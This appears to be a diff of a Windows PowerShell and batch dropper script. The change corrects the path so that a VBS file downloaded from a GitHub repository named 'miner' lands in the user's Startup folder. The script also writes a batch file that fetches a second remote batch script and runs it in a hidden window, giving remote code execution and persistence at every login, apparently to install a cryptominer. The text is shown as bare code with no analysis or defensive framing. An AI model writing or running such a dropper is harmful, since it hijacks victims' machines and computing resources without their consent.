@@ -1,4 +1,4 @@
-powershell curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" https://raw.githubusercontent.com/nmshare/miner/main/startup.vbs; 
+powershell curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.vbs" https://raw.githubusercontent.com/nmshare/miner/main/startup.vbs; 
 New-item C:\temp\start.bat;
 Set-Content -Path "C:\temp\start.bat" -Value "powershell curl -o C:\temp\scr.bat https://raw.githubusercontent.com/nmshare/miner/main/startup.bat; start-process C:\temp\scr.bat -windowStyle Hidden
 :start
